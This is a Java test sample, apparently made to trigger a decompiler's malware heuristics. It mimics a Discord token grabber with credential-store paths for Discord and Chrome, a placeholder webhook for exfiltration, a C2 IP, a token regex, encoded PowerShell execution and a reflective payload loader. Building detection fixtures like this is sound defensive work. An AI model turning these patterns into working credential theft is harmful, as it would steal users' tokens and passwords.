package com.evil;

// A deliberately suspicious sample mod used to exercise Endecompiler's
// heuristics engine. It does NOT run anything; it only contains the textual
// patterns a real RAT / token grabber would have.

import java.awt.Robot;
import java.io.File;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class TokenGrabber {

    static final String WEBHOOK =
        "https://discord.com/api/webhooks/123456789012345678/abcdEFGHijklMNOPqrstUVWXyz-1234567890_ABCdefGHIjklMNOpqrstUVWxyz";
    static final String C2 = "185.220.101.42";
    static final String TOKEN_PATTERN = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}";

    public void steal() throws Exception {
        String appdata = System.getenv("APPDATA");
        File leveldb = new File(appdata + "\\Discord\\Local Storage\\leveldb");
        File login = new File(appdata + "\\Google\\Chrome\\User Data\\Default\\Login Data");
        File cookies = new File(appdata + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");

        // Validate stolen token against Discord.
        URL me = new URL("https://discord.com/api/v9/users/@me");
        HttpURLConnection c = (HttpURLConnection) me.openConnection();
        c.setRequestProperty("Authorization", "stolen-token");

        // Exfiltrate.
        URL hook = new URL(WEBHOOK);
        HttpURLConnection ex = (HttpURLConnection) hook.openConnection();
        ex.setRequestMethod("POST");

        Runtime.getRuntime().exec("cmd.exe /c whoami");
        new ProcessBuilder("powershell", "-enc", "ZQBjAGgA").start();

        Robot robot = new Robot();
        robot.createScreenCapture(new java.awt.Rectangle(0, 0, 100, 100));

        System.out.println(leveldb + " " + login + " " + cookies + " " + C2 + " " + TOKEN_PATTERN);
    }

    // Dynamic decrypt-then-load: classic packed payload.
    public void unpack(String blob) throws Exception {
        byte[] data = Base64.getDecoder().decode(blob);
        Class<?> clazz = Class.forName("com.evil.Stage2");
        Method m = clazz.getDeclaredMethod("run", byte[].class);
        m.setAccessible(true);
        m.invoke(null, (Object) data);
    }
}
